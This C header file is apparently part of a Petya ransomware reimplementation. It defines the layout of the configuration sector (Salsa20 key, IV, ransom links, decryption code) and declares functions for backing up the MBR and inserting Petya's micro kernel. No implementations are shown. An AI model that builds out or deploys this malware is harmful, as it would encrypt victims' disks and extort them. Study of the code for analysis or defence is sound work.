#pragma once
#include <Windows.h>
#include <stdio.h>
HANDLE hHard;


typedef struct PetyaStruct
{

	UCHAR Encrypted; //0x00 - not encrypted | 0x01 - encrypted | 0x02 - decrypted
	UCHAR DecryptionKey[ 32 ]; //Salsa20 Key
	UCHAR IV[ 8 ]; //IV Key
	UCHAR FirstLink[ 36 ];
	UCHAR Reserved[ 6 ]; //Some new lines
	UCHAR SecondLink[ 36 ];
	UCHAR Reserved2[ 50 ]; //Empty
	UCHAR PersonalDecryptionCode[ 90 ];

}PetyaSectorData;

VOID
PetyaBackupMBR(

);

VOID
PetyaFillEmptySectors(

);

VOID
PetyaConfigurationSector(

);

VOID
PetyaInsertMicroKernel(

);